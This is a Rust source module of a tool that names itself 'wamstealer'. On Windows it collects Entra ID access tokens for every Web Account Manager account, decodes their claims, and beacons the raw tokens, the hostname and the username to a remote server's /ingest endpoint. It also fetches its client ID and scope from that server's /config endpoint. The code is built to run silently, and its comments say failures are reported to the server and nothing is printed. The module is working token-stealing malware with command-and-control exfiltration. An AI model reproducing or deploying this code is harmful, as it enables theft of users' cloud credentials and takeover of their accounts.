//! Beacons, remote configuration, and JWT claim extraction.
//!
//! The payload types are platform-independent so the server can depend on this
//! module. The HTTP calls and the collection orchestration only exist on
//! Windows, where WAM and the network stack live.
use serde::{Deserialize, Serialize};
use serde_json::Value;

pub const AGENT_ID: &str = concat!("wamstealer/", env!("CARGO_PKG_VERSION"));
pub const AUTH_HEADER: &str = "X-Auth";

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Claims {
    pub upn: Option<String>,
    pub tid: Option<String>,
    pub aud: Option<String>,
    pub scp: Option<String>,
    pub exp: Option<i64>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RemoteConfig {
    pub client_id: String,
    pub scope: String,
    pub authority: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "status")]
pub enum Outcome {
    #[serde(rename = "ok")]
    Ok {
        username: Option<String>,
        account_id: Option<String>,
        token: String,
        claims: Option<Claims>,
    },
    #[serde(rename = "error")]
    Error {
        username: Option<String>,
        account_id: Option<String>,
        error: Value,
    },
}

impl Outcome {
    pub fn ok(username: Option<String>, account_id: Option<String>, token: String) -> Self {
        let claims = decode_claims(&token);
        Self::Ok {
            username,
            account_id,
            token,
            claims,
        }
    }

    pub fn error(username: Option<String>, account_id: Option<String>, error: Value) -> Self {
        Self::Error {
            username,
            account_id,
            error,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Beacon {
    pub agent: String,
    pub hostname: String,
    pub username: String,
    pub client_id: String,
    pub scope: String,
    pub authority: String,
    pub results: Vec<Outcome>,
}

fn base64url_decode(value: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(value)
        .ok()
        .or_else(|| base64::engine::general_purpose::URL_SAFE.decode(value).ok())
}

/// Extract the claims of an access token without verifying it. Verification is
/// pointless here: the token was minted by Entra ID, and the server validates
/// the same fields again on receipt.
pub fn decode_claims(token: &str) -> Option<Claims> {
    let payload = token.split('.').nth(1)?;
    let bytes = base64url_decode(payload)?;
    let value: Value = serde_json::from_slice(&bytes).ok()?;
    Some(Claims {
        upn: value
            .get("preferred_username")
            .and_then(Value::as_str)
            .or_else(|| value.get("upn").and_then(Value::as_str))
            .map(str::to_string),
        tid: value.get("tid").and_then(Value::as_str).map(str::to_string),
        aud: match value.get("aud") {
            Some(Value::String(aud)) => Some(aud.clone()),
            Some(Value::Array(auds)) => auds
                .first()
                .and_then(Value::as_str)
                .map(str::to_string),
            _ => None,
        },
        scp: match value.get("scp") {
            Some(Value::String(scp)) => Some(scp.clone()),
            _ => match value.get("roles") {
                Some(Value::Array(roles)) => Some(
                    roles
                        .iter()
                        .filter_map(Value::as_str)
                        .collect::<Vec<_>>()
                        .join(" "),
                ),
                _ => None,
            },
        },
        exp: value.get("exp").and_then(Value::as_i64),
    })
}

#[cfg(windows)]
mod windows_beacon {
    use super::{Beacon, Outcome, RemoteConfig, AGENT_ID, AUTH_HEADER};
    use crate::options::Options;
    use serde_json::Value;
    use std::time::Duration;

    pub fn http_client(timeout: Duration) -> Option<reqwest::blocking::Client> {
        reqwest::blocking::Client::builder()
            .timeout(timeout)
            .build()
            .ok()
    }

    pub fn fetch_config(
        server: &str,
        secret: &str,
        timeout: Duration,
    ) -> Option<RemoteConfig> {
        let client = http_client(timeout)?;
        let response = client
            .get(format!("{server}/config"))
            .header(AUTH_HEADER, secret)
            .send()
            .ok()?;
        if !response.status().is_success() {
            return None;
        }
        let value: Value = response.json().ok()?;
        Some(RemoteConfig {
            client_id: value.get("client_id")?.as_str()?.to_string(),
            scope: value.get("scope")?.as_str()?.to_string(),
            authority: value
                .get("authority")
                .and_then(Value::as_str)
                .map(str::to_string),
        })
    }

    pub fn send(
        server: &str,
        secret: &str,
        beacon: &Beacon,
        timeout: Duration,
    ) -> Result<(), String> {
        let client = http_client(timeout).ok_or_else(|| "http client build failed".to_string())?;
        let body =
            serde_json::to_string(beacon).map_err(|error| error.to_string())?;
        let response = client
            .post(format!("{server}/ingest"))
            .header(AUTH_HEADER, secret)
            .header("content-type", "application/json")
            .body(body)
            .send()
            .map_err(|error| error.to_string())?;
        if response.status().is_success() {
            Ok(())
        } else {
            Err(format!("ingest failed with status {}", response.status()))
        }
    }

    /// Collect tokens for every WAM account and send them to the server. Every
    /// failure is reported to the server instead of the console; nothing is
    /// ever printed.
    pub fn beacon(options: &Options) -> Result<(), String> {
        let server = options
            .server
            .as_deref()
            .ok_or_else(|| "missing --server".to_string())?;
        let secret = options
            .secret
            .as_deref()
            .ok_or_else(|| "missing --secret".to_string())?;

        let (client_id, scope, authority) = match fetch_config(server, secret, options.timeout) {
            Some(config) => (
                config.client_id,
                config.scope,
                config
                    .authority
                    .unwrap_or_else(|| options.authority.clone()),
            ),
            None => (
                options.client_id.clone(),
                options.scope.clone(),
                options.authority.clone(),
            ),
        };

        let mut effective = options.clone();
        effective.client_id = client_id.clone();
        effective.scope = scope.clone();
        effective.authority = authority.clone();

        let results = match crate::wam::collect(&effective) {
            Ok(outcomes) => outcomes
                .into_iter()
                .map(|outcome| {
                    let username = outcome.account.as_ref().map(|a| a.username.clone());
                    let account_id = outcome
                        .account
                        .as_ref()
                        .map(|a| a.account_id.clone());
                    match outcome.result {
                        Ok(token) => Outcome::ok(username, account_id, token),
                        Err(failure) => Outcome::error(username, account_id, failure.report),
                    }
                })
                .collect(),
            Err(failure) => vec![Outcome::error(None, None, failure.report)],
        };

        let beacon = Beacon {
            agent: AGENT_ID.to_string(),
            hostname: std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into()),
            username: std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into()),
            client_id,
            scope,
            authority,
            results,
        };
        send(server, secret, &beacon, options.timeout)
    }
}

#[cfg(windows)]
pub use windows_beacon::{beacon, fetch_config, send};
